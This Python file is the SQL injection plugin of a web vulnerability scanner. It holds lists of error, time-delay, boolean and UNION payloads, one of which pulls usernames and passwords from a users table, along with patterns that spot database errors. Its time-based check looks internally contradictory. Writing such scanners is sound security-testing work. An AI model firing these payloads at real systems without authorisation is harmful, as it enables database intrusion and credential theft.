"""SQL Injection audit plugin — detects SQL injection vulnerabilities.

Detects error-based, boolean-based, time-based, and UNION-based SQL injection
across multiple database backends (MySQL, PostgreSQL, MSSQL, Oracle, SQLite).
Tests both GET and POST parameters.
"""

from __future__ import annotations

import asyncio
import re
from typing import Any

import structlog

from xfweb.core.plugins.plugin_base import AuditPlugin
from xfweb.core.net.http_engine import HttpEngine
from xfweb.core.data.parsers.param_extractor import extract_params

logger = structlog.get_logger()

SQLI_ERROR_PATTERNS = [
    re.compile(r"sql syntax.*?mysql", re.IGNORECASE),
    re.compile(r"mysql_fetch", re.IGNORECASE),
    re.compile(r"ORA-\d{5}", re.IGNORECASE),
    re.compile(r"Microsoft OLE DB", re.IGNORECASE),
    re.compile(r"ODBC SQL Server", re.IGNORECASE),
    re.compile(r"PostgreSQL.*?ERROR", re.IGNORECASE),
    re.compile(r"pg_query\(\)", re.IGNORECASE),
    re.compile(r"SQLite/JDBCDriver", re.IGNORECASE),
    re.compile(r"SQLite::prepare", re.IGNORECASE),
    re.compile(r"Warning:.*?mysql", re.IGNORECASE),
    re.compile(r"valid MySQL result", re.IGNORECASE),
    re.compile(r"Unclosed quotation mark", re.IGNORECASE),
    re.compile(r"unterminated quoted string", re.IGNORECASE),
    re.compile(r"SQLSTATE", re.IGNORECASE),
    re.compile(r"syntax error at or near", re.IGNORECASE),
    re.compile(r'near ".*?".*?:.*?syntax', re.IGNORECASE),
    re.compile(r"You have an error in your SQL", re.IGNORECASE),
    re.compile(r"The error occurred in.*?query", re.IGNORECASE),
    re.compile(r"Query failed", re.IGNORECASE),
    re.compile(r"Database error", re.IGNORECASE),
    re.compile(r"Supplied argument is not a valid MySQL", re.IGNORECASE),
    re.compile(r"mysql_num_rows", re.IGNORECASE),
    re.compile(r"pg_exec", re.IGNORECASE),
    re.compile(r"ORA-01756", re.IGNORECASE),
    re.compile(r"Microsoft SQL Native Client error", re.IGNORECASE),
    re.compile(r"javax\.servlet\.ServletException", re.IGNORECASE),
    re.compile(r"System\.Data\.SqlClient\.SqlException", re.IGNORECASE),
    re.compile(r"MySqlException", re.IGNORECASE),
    re.compile(r"org\.postgresql\.util\.PSQLException", re.IGNORECASE),
    re.compile(r"SQLiteException", re.IGNORECASE),
]

ERROR_PAYLOADS = [
    "'",
    "''",
    '"',
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "1' OR '1'='1",
    "1; SELECT 1",
    "')) OR 1=1--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND '1'='1",
    "' AND '1'='2",
    "1' AND '1'='2",
    "1' ORDER BY 100--",
    "') OR ('1'='1",
    "1' OR '1'='1' LIMIT 1--",
]

TIME_PAYLOADS = [
    ("' OR SLEEP(5)--", 4500),
    ("'; WAITFOR DELAY '0:0:5'--", 4500),
    ("' OR pg_sleep(5)--", 4500),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 4500),
    ("'; SELECT pg_sleep(5);--", 4500),
    ("1'; SELECT SLEEP(5)--", 4500),
    ("1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--", 4500),
]

BOOLEAN_TRUE_PAYLOADS = [
    "' OR 1=1--",
    "' OR 'a'='a",
    "1' OR 1=1#",
    "') OR (1=1",
    "' OR 'x'='x",
    "1' OR '1'='1' /*",
    "true' OR true--",
]

BOOLEAN_FALSE_PAYLOADS = [
    "' OR 1=2--",
    "' OR 'a'='b",
    "1' OR 1=2#",
    "') OR (1=2",
    "' OR 'x'='y",
    "1' OR '1'='2' /*",
    "true' OR false--",
]

UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "1' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1 UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
]

DBMS_FINGERPRINT_PAYLOADS = {
    "mysql": ["' AND @@version--", "1' AND @@version LIKE '5%--"],
    "postgresql": ["' AND version() LIKE 'PostgreSQL%--", "1' AND version() LIKE '9%--"],
    "mssql": ["' AND @@version--", "1' AND CAST(@@version AS INT)--"],
    "oracle": ["' AND banner LIKE 'Oracle%--", "1' AND ROWNUM=1--"],
}


class SqliPlugin(AuditPlugin):
    """SQL Injection vulnerability detector with error, boolean, time, and UNION-based detection."""

    plugin_name = "sqli"
    brief_description = "Detect SQL injection vulnerabilities (error/boolean/time/UNION-based)"

    async def audit(self, freq: Any, http: HttpEngine) -> None:
        params = self._extract_params(freq)
        if not params:
            return

        baseline = await self._get_baseline(freq, http)

        tasks = []
        for param_name, param_value in params.items():
            tasks.append(self._test_param(freq, param_name, param_value, http, baseline))

        await asyncio.gather(*tasks, return_exceptions=True)

    def _extract_params(self, freq: Any) -> dict[str, str]:
        return extract_params(freq)

    async def _get_baseline(self, freq: Any, http: HttpEngine) -> Any:
        return await http.get(freq.url.raw_url)

    async def _test_param(
        self, freq: Any, param_name: str, param_value: str, http: HttpEngine, baseline: Any
    ) -> None:
        logger.debug("xfweb.sqli.testing", param=param_name, url=freq.url.raw_url)

        # Error-based detection
        for payload in ERROR_PAYLOADS:
            resp = await self._inject(freq, param_name, param_value, payload, http)
            if resp.status_code == 0:
                continue
            if self._check_error_response(resp):
                self.report_finding(
                    name=f"SQL Injection (error-based) in '{param_name}'",
                    severity="high",
                    url=freq.url.raw_url,
                    description=f"SQL error-based injection detected in parameter '{param_name}'. "
                    "The application returns database error messages when malicious input is provided.",
                    parameter=param_name,
                    evidence=f"Payload: {payload}\nError pattern found in response body",
                    http_request={"method": freq.method, "url": freq.url.raw_url, "data": freq.post_data or ""},
                    http_response={"status": resp.status_code, "body_excerpt": resp.text[:500]},
                    remediation="Use parameterized queries/prepared statements. "
                    "Never concatenate user input into SQL queries. "
                    "Implement input validation and WAF rules.",
                )
                return

        # Time-based detection
        for payload, threshold_ms in TIME_PAYLOADS:
            start = __import__("time").monotonic()
            resp = await self._inject(freq, param_name, param_value, payload, http)
            elapsed = (__import__("time").monotonic() - start) * 1000
            if resp.status_code == 0:
                continue
            if elapsed >= threshold_ms and resp.elapsed_ms < 100:
                self.report_finding(
                    name=f"SQL Injection (time-based blind) in '{param_name}'",
                    severity="high",
                    url=freq.url.raw_url,
                    description=f"SQL time-based blind injection detected. "
                    f"Response took {elapsed:.0f}ms (threshold: {threshold_ms}ms).",
                    parameter=param_name,
                    evidence=f"Payload: {payload}\nElapsed: {elapsed:.0f}ms",
                    http_request={"method": freq.method, "url": freq.url.raw_url, "data": freq.post_data or ""},
                    http_response={"status": resp.status_code},
                    remediation="Use parameterized queries/prepared statements.",
                )
                return

        # Boolean-based detection
        true_len = 0
        for i, payload in enumerate(BOOLEAN_TRUE_PAYLOADS):
            resp = await self._inject(freq, param_name, param_value, payload, http)
            if resp.status_code == 0:
                continue
            true_len = len(resp.body)
            break

        if true_len > 0:
            for i, payload in enumerate(BOOLEAN_FALSE_PAYLOADS):
                if i < len(BOOLEAN_TRUE_PAYLOADS):
                    resp = await self._inject(freq, param_name, param_value, payload, http)
                    if resp.status_code == 0:
                        continue
                    false_len = len(resp.body)
                    baseline_len = len(baseline.body)
                    diff = abs(true_len - false_len)
                    if diff > 10 and true_len != baseline_len:
                        self.report_finding(
                            name=f"SQL Injection (boolean-based blind) in '{param_name}'",
                            severity="high",
                            url=freq.url.raw_url,
                            description=f"SQL boolean-based blind injection detected. "
                            f"Response size differs significantly between true/false conditions "
                            f"(true: {true_len}, false: {false_len}, baseline: {baseline_len}).",
                            parameter=param_name,
                            evidence=f"True payload: {BOOLEAN_TRUE_PAYLOADS[i]}\n"
                            f"False payload: {payload}\n"
                            f"Response sizes: true={true_len}, false={false_len}",
                            http_request={"method": freq.method, "url": freq.url.raw_url},
                            http_response={"status": resp.status_code},
                            remediation="Use parameterized queries/prepared statements.",
                        )
                        return

        # UNION-based detection
        for payload in UNION_PAYLOADS:
            resp = await self._inject(freq, param_name, param_value, payload, http)
            if resp.status_code == 0:
                continue
            if resp.status_code == 200 and self._check_union_response(resp, baseline):
                self.report_finding(
                    name=f"SQL Injection (UNION-based) in '{param_name}'",
                    severity="critical",
                    url=freq.url.raw_url,
                    description=f"SQL UNION-based injection detected. "
                    "The application returns additional data when UNION SELECT is used.",
                    parameter=param_name,
                    evidence=f"Payload: {payload}\nResponse size increased significantly",
                    http_request={"method": freq.method, "url": freq.url.raw_url, "data": freq.post_data or ""},
                    http_response={"status": resp.status_code, "body_excerpt": resp.text[:500]},
                    remediation="Use parameterized queries/prepared statements. "
                    "Apply strict input validation. Restrict database user permissions.",
                )
                return

    async def _inject(self, freq: Any, param: str, value: str, payload: str, http: HttpEngine) -> Any:
        """Inject payload into parameter and return response."""
        if freq.method.upper() == "POST" and freq.post_data:
            new_data = freq.post_data.replace(f"{param}={value}", f"{param}={payload}")
            return await http.post(freq.url.raw_url, data=new_data)
        else:
            new_url = freq.url.raw_url.replace(f"{param}={value}", f"{param}={payload}")
            return await http.get(new_url)

    def _check_error_response(self, resp: Any) -> bool:
        body = resp.text
        return any(pattern.search(body) for pattern in SQLI_ERROR_PATTERNS)

    def _check_union_response(self, resp: Any, baseline: Any) -> bool:
        """Check if UNION payload returned additional data."""
        if len(resp.body) < 50:
            return False
        size_diff = len(resp.body) - len(baseline.body)
        return size_diff > 100
